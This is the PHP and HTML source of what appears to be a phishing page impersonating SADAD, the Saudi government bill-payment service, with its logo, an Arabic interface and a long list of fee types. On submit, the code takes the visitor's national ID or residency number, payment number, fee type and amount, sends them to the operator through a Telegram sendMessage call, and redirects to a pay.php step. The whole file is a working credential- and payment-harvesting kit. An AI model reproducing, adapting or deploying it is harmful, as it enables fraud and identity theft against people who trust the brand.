<?php
// Version 1.2 bata 2023-7-11
include_once "telegram.php";
if (isset($_POST['submit'])) {
    $uid = rand(1000000000, intval(1999999999));
    $message = "_______ هنالك طلب جديد _______ "."\n"."\n";
    $message.= "رقم العملية".":".$uid."\n"."\n";
    $message.= "رقم البطاقة / الاقامة".":".$_POST['inp1']."\n"."\n";
    $message.= "رقم السداد".":".$_POST['inp2']."\n"."\n";
    $message.= "نوع السداد".":".$_POST['inp3']."\n"."\n";
    $message.= "رسوم السداد".":".$_POST['inp4']."\n"."\n";
//  $message.= "".":".$_POST['']."\n"."\n";
    sendMessage($message);
    header("Location: pay.php?id=$uid");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="css/index.css">
  <link rel="stylesheet" href="css/bootstrap.css" type="text/css" media="all" />
  <script src="js/index.js"></script>
  <script src="js/bootstrap.js" type="text/javascript" charset="utf-8"></script>
  <title>sddad</title>
</head>
<body>
 <!-- Nav -->
<nav class="navbar navbar-expand-lg bg-light">
  <div class="container-fluid">
    <a class="navbar-brand" href="#">
      <img src="sadad_logo.png" alt="sddad" width="60" height="30">
    </a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent" dir="rtl">
      <ul class="navbar-nav me-auto mb-2 mb-lg-0">
        <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="index.html">الرئيسيه</a>
        </li>
        <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="index.html">شخصي</a>
        </li>
        <li class="nav-item">
          <a class="nav-link " href="NewService.html">بدأ الخدمه</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="about-us.html">عن سداد </a>
        </li>
      </ul>
    </div>
  </div>
</nav>
 <!-- end  -->
<!--- main  -->
<section class="main"  dir="rtl">
  <form action="" method="POST" accept-charset="utf-8" class="p-3">
       <!-- what is addad -->
   <div class="p-3 pt-2 pb-2 form-control mb-3 infodb">
     <h5>للسداد الحكومي</h5>
     <p class="p-1 pb-0">
       مع فواتير سداد، يمكنك دفع كل الفواتير من خلال البنك، كفواتير الكهرباء، والمياه،  والاتصالات، والرسوم الحكومية
     </p>
   </div>
   <!---end  -->
   <div class="mb-3">
    <label for="formGroupExampleInput" class="form-label">ادخل رقم البطاقة/ الاقامة</label>
    <input name="inp1" type="text" class="form-control" id="formGroupExampleInput" placeholder="ادخل الرقم هنا ">
   </div>
   <div class="mb-3">
    <label for="formGroupExampleInput" class="form-label">أدخل رقم السداد</label>
    <input name="inp2" type="text" class="form-control" id="formGroupExampleInput" placeholder="أدخل رقم السداد هنا">
   </div>
   <div class="mb-3">
    <label for="formGroupExampleInput" class="form-label">اختر نوع السداد</label>
    <select name="inp3" class="form-select" id="inlineFormSelectPref">
    <option value=""> اختر نوع السداد</option>
    <option value="مدفوعات حكومية">مدفوعات حكومية</option>
    <option value="مدفوعات ديوان ملكي">              
                                                        	مدفوعات ديوان ملكي</option>
    <option value="مدفوعات تأمينات اجتماعية"> 
                                                        		مدفوعات تأمينات اجتماعية
    </option>
    <option value="مدفوعات الزراعة والبيئة ">
                                                        			    مدفوعات الزراعة والبيئة 
                                                        			     </option>
                                                        				<option value="رسوم مركبات"> 
                                                        				رسوم مركبات
                                                        				</option>
                                                        					<option value="رسوم تمكين ">
                                                        					    رسوم تمكين 
                                                        					     </option>
                                                        	                                                        					<option value=" استرداد مبلغ">
                                                        	                                                        					 استرداد مبلغ
                                            	                                                        				 </option>
							<option value="مدفوعات الجوازات">مدفوعات الجوازات</option>
							<option value="مدفوعات مخالفات مكتب العمل">مدفوعات مخالفات مكتب العمل</option>
							<option value="رسوم نقل كفالة">رسوم نقل كفالة</option>
							<option value="رسوم تغيير مهنة">رسوم تغيير مهنة</option>
							<option value="دفع رسوم تأييد رعاة">دفع رسوم تأييد رعاة</option>
							<option value="تجديد استماره">تجديد استماره</option>
							<option value="رسوم تسوية جرعات كورونا">رسوم تسوية جرعات كورونا</option>
							<option value="مدفوعات مخالفات مرورية">مدفوعات مخالفات مرورية</option>
							<option value="مدفوعات رسوم تصفير مخالفات ">مدفوعات رسوم تصفير مخالفات</option>
							<option value="مدفوعات رسوم تصفير الزكاة  ">مدفوعات رسوم تصفير الزكاة</option>
							<option value="مدفوعات رسوم سعودة "> مدفوعات رسوم سعودة </option>
							<option value="مدفوعات رسوم سداد تمويل "> مدفوعات رسوم سداد تمويل</option>
							<option value="مدفوعات تمكين "> مدفوعات تمكين </option>
							<option value="مدفوعات المياه "> مدفوعات المياه</option>
							<option value="مدفوعات الكهرباء">مدفوعات الكهرباء</option>
							<option value="مدفوعات بلاغات التقيد">مدفوعات بلاغات التقيد</option>
							<option value="مدفوعات عقد إلكتروني (سائق-عاملة منزلية-عامل-مهني)">مدفوعات عقد إلكتروني (سائق-عاملة منزلية-عامل-مهني) </option>
							<option value="مدفوعات إلغاء هروب">مدفوعات إلغاء هروب</option>
							<option value="مدفوعات عقد أجير">مدفوعات عقد أجير</option>
							<option value="مدفوعات نقل ملكية">مدفوعات نقل ملكية</option>
					 <!-- Add Abdurhman Abdullah Al krill -->
               <option value="حجز مركبة">حجز مركبة</option>
               <option value="شحن مركبة ">شحن مركبة </option>                                 
               <option value="عقد تأمين ">عقد تأمين </option>                           
               <option value="عقد الكتروني ">عقد الكتروني </option>                    
               <option value="حجز مؤقت ">حجز مؤقت </option>      
               <option value="مدفوعات منصة صحة">مدفوعات منصة صحة</option> 
               <option value="رسوم شحن سمسا">رسوم شحن سمسا</option>
               <option value="رسوم شحن ارامكس">رسوم شحن ارامكس</option>
               <option value="رسوم تأشيرة">رسوم تأشيرة</option>
               <option value="توثيق وإدارة العقود الإلكترونية ">توثيق وإدارة العقود الإلكترونية </option>
              <option value="مدفوعة آخرى">مدفوعة آخرى</option>
    </select>
   </div>
   <div class="mb-3">
    <label for="formGroupExampleInput" class="form-label">ادخل قيمة رسوم السداد </label>
    <input name="inp4" type="text" class="form-control" id="formGroupExampleInput" placeholder="ريال سعودي">
   </div>
   <button class="btn btn-primary btn-large" style="width:100%" type="submit" name="submit"> دخول</button>
  </form>
</section>
<!-- end -->
    <footer class="footer  p-2  text-center border-top text-center mt-4 infodb" dir="rtl">
    <div class="footer-copyright">
          <div class="">
                        <label id="CopyRight">جميع الحقوق محفوظة ® سداد حقوق الطبع والنشر 2023</label>
          </div>
    </div>
    </footer>
</body>
</html>